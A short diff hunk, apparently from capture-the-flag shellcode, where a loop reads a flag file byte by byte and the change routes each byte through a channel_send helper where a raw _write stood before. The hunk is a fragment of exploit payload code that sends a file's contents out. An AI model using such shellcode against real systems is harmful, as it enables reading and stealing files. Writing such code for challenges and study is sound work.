@@ -14,7 +14,7 @@ SHELLCODE_ENTRY {
 
     while ( _read(flag_fd, &c, sizeof(c)) > 0 )
     {
-        _write(chan.tx, &c, sizeof(c));
+        channel_send(chan, &c, sizeof(c));
     }
 
 } SHELLCODE_END
